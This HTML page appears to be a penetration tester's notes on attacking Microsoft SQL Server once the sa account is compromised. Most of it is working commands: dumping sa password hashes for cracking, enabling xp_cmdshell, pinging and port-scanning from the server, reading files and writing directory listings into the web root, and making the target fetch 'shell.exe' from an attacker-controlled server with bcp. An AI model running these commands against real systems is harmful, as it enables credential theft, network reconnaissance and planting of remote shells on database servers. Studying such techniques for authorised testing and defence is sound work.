<!doctype html>
<html>

<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>MS SQL Server</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>

<body>
  <div class='page'>
    <h1 class='title'>MS SQL Server</h1><br /><br /><strong>What is the sa account</strong><br />The <span
      style="text-decoration:underline;">sa</span> (short for <em>system administrator</em>) account is the most
    powerful account in a SQL Server instance. <br />It is one of the riskiest server-level principals in SQL Server.
    It’s automatically added as a member of the sysadmin fixed server role and, as such, has all permissions on that
    instance and can perform any activity.<br /><span style="text-decoration:underline;">Retrieve sa password
      hash</span><br /> ◇ MSSQL Server 2000<br />
    <div class="codebox">
      <div class="codebox">SELECT&nbsp;name,&nbsp;password&nbsp;FROM&nbsp;master..sysxlogins</div>
    </div><br /> ◇ MSSQL Server &gt;= 2005<br />
    <div class="codebox">
      <div class="codebox">SELECT&nbsp;name,&nbsp;password_hash&nbsp;FROM&nbsp;master.sys.sql_logins</div>
    </div><br /> Once we have the SHA-1 hash of the password, we can crack it and access the database in the same manner
    as a legitimate database administrator.<br /><span style="text-decoration:underline;">After retrieved sa
      account</span> we have access to some interesting Advanced features, see below.<br /><br /><strong>enable
      xp_cmdshell</strong> (necessary for some commands below)<br />It require sa privileges and is not enabled by
    default.<br />• To <span style="text-decoration:underline;">enable it</span> we have to issue the following
    commands:<br />
    <div class="codebox">
      <div class="codebox">
        EXEC&nbsp;sp_configure&nbsp;&#39;show&nbsp;advanced&nbsp;options&#39;,&nbsp;1;<br />RECONFIGURE;<br />EXEC&nbsp;sp_configure&nbsp;&#39;xp_cmdshell&#39;,&nbsp;1;<br />RECONFIGURE;
      </div>
    </div><br />• To <span style="text-decoration:underline;">disable it</span> we have to issue the following
    commands(after we are done with our tests):<br />
    <div class="codebox">
      <div class="codebox">
        EXEC&nbsp;sp_configure&nbsp;&#39;xp_cmdshell&#39;,&nbsp;0;<br />EXEC&nbsp;sp_configure&nbsp;&#39;show&nbsp;advanced&nbsp;options&#39;,&nbsp;0;<br />RECONFIGURE;
      </div>
    </div> <br /><br /><strong>
      <h3>Commands that we can launch on the database server</h3>
    </strong><br /><br /><strong>Ping</strong> (xp_cmdshell)<br />
    <div class="codebox">
      <div class="codebox">EXEC&nbsp;master.dbo.xp_cmdshell&nbsp;&#39;ping&nbsp;&lt;Target-IP-Address&gt;&#39;</div>
    </div><br /> <span style="text-decoration:underline;">Note</span>: the query above does not show results to us<br />
    We can use the <em>query execution time</em> to infer the ping result. To do that, we have to compare the execution
    time of a ping command executed against a known live host(e.g.: database server) and the execution time against the
    host we want to test. By default the MS ping utility sends four ICMP echo requests.<br /> - pinging a live host
    takes about 5 to 8 seconds<br /> - pinging a bogus IP address takes from 20 to 30 seconds<br /><br /><strong>Port
      scanner</strong> (OPENROWSET method)<br />
    <div class="codebox">
      <div class="codebox">
        SELECT&nbsp;*&nbsp;from&nbsp;OPENROWSET(&#39;SQLOLEDB&#39;,&nbsp;&#39;uid=sa;pwd=something;Network=DBMSSOCN;Address=&lt;Target-IP-Address&gt;,&lt;Target-Port&gt;;timeout=&lt;Connection-Timeout-in-Seconds&gt;&#39;,&nbsp;&#39;select&nbsp;1&#39;)--
      </div>
    </div><br /> ◇ port open → error: “General network error. Check your network documentation”<br /> ◇ port closed →
    error: “SQL Server does not exist or access denied”. <br /> - port closed but errors are hidden → connection will
    timeout displaying the seconds<br /><br /><strong>Read File System</strong><br /> ◇ dir command (xp_cmdshell)<br />
    read the file system by launching the dir command<br />
    <div class="codebox">
      <div class="codebox">EXEC&nbsp;master..xp_cmdshell&nbsp;&#39;dir&nbsp;&lt;target&nbsp;directory&gt;&#39;</div>
    </div><br /> To read the result, we can save the output of the command on a web accessible folder:<br />
    <div class="codebox">
      <div class="codebox">
        EXEC&nbsp;master..xp_cmdshell&nbsp;&#39;dir&nbsp;c:\&nbsp;&gt;&nbsp;C:\inetpub\wwwroot\site\dir.txt&#39;--</div>
    </div><br /> Then just browse to dir.txt at the URL: <a
      href="http://site.com/dir.txt" target="_blank">http://site.com/dir.txt</a><br /> ◇ Save file in a table and extract it<br />
    <div class="codebox">
      <div class="codebox">
        CREATE&nbsp;TABLE&nbsp;filecontent(line&nbsp;varchar(8000));<br />BULK&nbsp;INSERT&nbsp;filecontent&nbsp;FROM&nbsp;&#39;&lt;target&nbsp;file&gt;&#39;;<br />DROP&nbsp;TABLE&nbsp;filecontent;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;--&nbsp;cooment:&nbsp;drop&nbsp;the&nbsp;table&nbsp;after&nbsp;extracting&nbsp;it
      </div>
    </div><br /><br /><strong>Uploading Files</strong><br /> 1) Insert the file into a table in a external MS SQL
    database under our(attacker) control<br />
    <div class="codebox">
      <div class="codebox">
        CREATE&nbsp;TABLE&nbsp;HelperTable&nbsp;(file&nbsp;text)<br />BULK&nbsp;INSERT&nbsp;HelperTable&nbsp;FROM&nbsp;&#39;shell.exe&#39;&nbsp;WITH&nbsp;<span
          style="color:#000000;font-weight:400">(</span>codepage=&#39;RAW&#39;<span
          style="color:#000000;font-weight:400">)</span></div>
    </div><br /> 2) Force the target DB server to retrieve it from our(attacker) server<br />
    <div class="codebox">
      <div class="codebox">
        EXEC&nbsp;xp_cmdshell&nbsp;&#39;bcp&nbsp;&quot;SELECT&nbsp;*&nbsp;FROM&nbsp;HelperTable&quot;&nbsp;queryout&nbsp;shell.exe&nbsp;-c&nbsp;-Craw&nbsp;-S&lt;our&nbsp;Server&nbsp;Address&gt;&nbsp;-U&lt;our&nbsp;Server&nbsp;Username&gt;&nbsp;-P&lt;our&nbsp;Server&nbsp;Password&gt;&#39;
      </div>
    </div><br /><br /><br />Bibliography:<br />• <a
      href="https://www.red-gate.com/simple-talk/devops/data-privacy-and-protection/introduction-to-sql-server-security-part-4/" target="_blank">https://www.red-gate.com/simple-talk/devops/data-privacy-and-protection/introduction-to-sql-server-security-part-4/</a>
  </div>
</body>

</html>